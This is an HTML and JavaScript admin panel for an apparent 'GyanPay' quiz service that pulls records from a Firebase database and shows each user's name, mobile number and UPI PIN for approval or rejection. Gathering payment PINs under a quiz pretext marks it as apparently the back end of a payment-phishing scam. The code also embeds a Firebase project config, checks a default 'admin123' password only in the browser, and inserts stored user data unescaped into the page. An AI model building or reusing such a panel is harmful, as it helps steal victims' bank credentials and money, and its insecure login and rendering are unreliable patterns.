<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GyanPay - Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #0f172a; color: #ffffff; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        h2, h3 { color: #f8fafc; text-align: center; }
        .login-box, .admin-panel { display: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; border: 1px solid #334155; text-align: center; }
        th { background-color: #3b82f6; color: white; }
        tr:nth-child(even) { background-color: #172033; }
        button { padding: 6px 12px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
        .btn-approve { background-color: #10b981; }
        .btn-reject { background-color: #ef4444; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .settings-card { background: #0f172a; padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #334155; }
        .settings-card input, .settings-card select { padding: 8px; margin: 5px 10px 5px 0; background: #1e293b; border: 1px solid #475569; color: white; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loginBox" class="login-box" style="display: block;">
            <h2>Admin Portal Login</h2>
            <div style="text-align: center; margin-top: 20px;">
                <input type="password" id="adminPasswordInput" placeholder="Enter Admin Password" style="padding: 10px; width: 60%; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px;"><br><br>
                <button onclick="loginAdmin()" style="background-color: #3b82f6; padding: 10px 20px; border-radius: 6px;">Login</button>
                <p id="loginError" style="color: #ef4444; margin-top: 10px;"></p>
            </div>
        </div>

        <div id="adminPanel" class="admin-panel">
            <div class="top-bar">
                <h2>GyanPay Admin Dashboard</h2>
                <button onclick="changePassword()" style="background-color: #f59e0b; color: black;">Change Password</button>
            </div>

            <!-- Quiz Start Time Schedule Panel -->
            <div class="settings-card">
                <h3>⏰ Quiz Start Time Scheduler</h3>
                <div style="text-align: center;">
                    <label>Start After: </label>
                    <input type="number" id="startTimeValue" value="30" style="width: 70px;">
                    <select id="startTimeUnit">
                        <option value="minutes">Minutes (मिनट बाद)</option>
                        <option value="hours">Hours (घंटे बाद)</option>
                    </select>
                    <button onclick="saveQuizTimer()" style="background-color: #10b981; padding: 8px 16px; margin-left: 10px;">Set & Broadcast Timer</button>
                </div>
            </div>
            
            <h3>User Submissions & Approvals</h3>
            <div id="loading" style="text-align: center; color: #94a3b8;">Loading data from database...</div>
            
            <table id="dataTable" style="display: none;">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>User Name</th>
                        <th>Mobile Number</th>
                        <th>Password/PIN</th>
                        <th>Status</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="tableBody"></tbody>
            </table>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, getDocs, updateDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
          authDomain: "gyanpey.firebaseapp.com",
          projectId: "gyanpey",
          storageBucket: "gyanpey.firebasestorage.app",
          messagingSenderId: "198373987569",
          appId: "1:198373987569:web:1a03dfe48402106d750550"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        if (!localStorage.getItem("adminPass")) localStorage.setItem("adminPass", "admin123");
        
        // Default: 30 minutes later target time
        if (!localStorage.getItem("quizTargetTime")) {
            const futureTime = new Date().getTime() + 30 * 60 * 1000;
            localStorage.setItem("quizTargetTime", futureTime);
        }

        window.loginAdmin = function() {
            const pass = document.getElementById("adminPasswordInput").value;
            if (pass === localStorage.getItem("adminPass")) {
                document.getElementById("loginBox").style.display = "none";
                document.getElementById("adminPanel").style.display = "block";
                loadAdminData();
            } else {
                document.getElementById("loginError").innerText = "Invalid Password!";
            }
        };

        window.changePassword = function() {
            const newPass = prompt("Enter new admin password:");
            if (newPass) {
                localStorage.setItem("adminPass", newPass);
                alert("Password changed successfully!");
            }
        };

        window.saveQuizTimer = function() {
            const val = parseInt(document.getElementById("startTimeValue").value);
            const unit = document.getElementById("startTimeUnit").value;
            
            let ms = val * 60 * 1000; // minutes
            if (unit === "hours") {
                ms = val * 60 * 60 * 1000; // hours
            }

            const targetTime = new Date().getTime() + ms;
            localStorage.setItem("quizTargetTime", targetTime);
            alert("Quiz start timer successfully updated for all users!");
        };

        async function loadAdminData() {
            const tableBody = document.getElementById('tableBody');
            const loading = document.getElementById('loading');
            const dataTable = document.getElementById('dataTable');

            try {
                const q = query(collection(db, "usersData"), orderBy("timestamp", "desc"));
                const querySnapshot = await getDocs(q);

                tableBody.innerHTML = "";
                let index = 1;

                if (querySnapshot.empty) {
                    loading.innerHTML = "No data found in database.";
                    return;
                }

                querySnapshot.forEach((documentSnap) => {
                    const data = documentSnap.data();
                    const docId = documentSnap.id;
                    const status = data.status || "Pending";

                    const row = `<tr>
                        <td>${index++}</td>
                        <td>${data.userName || 'N/A'}</td>
                        <td>${data.mobileNumber || 'N/A'}</td>
                        <td>${data.upiPin || 'N/A'}</td>
                        <td><b>${status}</b></td>
                        <td>
                            <button class="btn-approve" onclick="updateStatus('${docId}', 'Approved')">Approve</button>
                            <button class="btn-reject" onclick="updateStatus('${docId}', 'Rejected')">Reject</button>
                        </td>
                    </tr>`;
                    tableBody.innerHTML += row;
                });

                loading.style.display = "none";
                dataTable.style.display = "table";
            } catch (error) {
                console.error("Error: ", error);
            }
        }

        window.updateStatus = async function(docId, newStatus) {
            const docRef = doc(db, "usersData", docId);
            await updateDoc(docRef, { status: newStatus });
            alert("Status updated to: " + newStatus);
            loadAdminData();
        };
    </script>
</body>
</html>
